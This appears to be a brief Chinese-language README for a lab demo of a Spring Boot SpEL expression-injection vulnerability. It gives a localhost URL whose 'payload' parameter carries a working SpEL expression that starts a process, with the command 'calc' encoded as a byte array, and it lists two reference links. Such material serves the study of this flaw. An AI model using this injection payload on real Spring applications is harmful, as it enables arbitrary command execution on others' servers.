SpringBoot SpEL表达式注入漏洞
IDEA导入

执行http://127.0.0.1:8080/fail2?payload=${new%20java.lang.ProcessBuilder(new%20java.lang.String(new%20byte[]{99,97,108,99})).start()}


参考


https://www.cnblogs.com/litlife/archive/2018/12/27/10183137.html
https://mp.weixin.qq.com/s?__biz=MzAwMzI0MTMwOQ==&mid=2650173748&idx=1&sn=a0fa9e48ed05d80b7c693082f6b687ce&scene=1&srcid=0911LaFVNrVdYZr7nIyS8Nn3#rd
